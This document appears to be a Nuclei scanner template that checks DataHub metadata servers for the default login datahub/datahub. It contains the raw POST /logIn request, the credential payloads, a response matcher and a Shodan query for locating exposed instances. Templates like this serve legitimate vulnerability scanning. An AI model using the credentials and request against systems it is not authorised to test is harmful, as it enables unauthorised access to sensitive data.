http:
- attack: pitchfork
  matchers:
  - part: header
    type: word
    words:
    - 'Set-Cookie: actor=urn:li:corpuser:datahub;'
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - datahub
    username:
    - datahub
  raw:
  - 'POST /logIn HTTP/2

    Host: {{Hostname}}

    Content-Type: application/json


    {"username":"{{username}}","password":"{{password}}"}

    '
id: datahub-metadata-default-login
info:
  author: queencitycyber
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: DataHub Metadata contains a default login vulnerability.  An attacker
    can obtain access to user accounts and access sensitive information, modify data,
    and/or execute unauthorized operations.
  metadata:
    max-request: 1
    shodan-query: http.title:"DataHub"
    verified: true
  name: DataHub Metadata - Default Login
  reference:
  - https://github.com/datahub-project/datahub/blob/master/docs/rfc/active/access-control/access-control.md
  severity: high
  tags: datahub,default-login
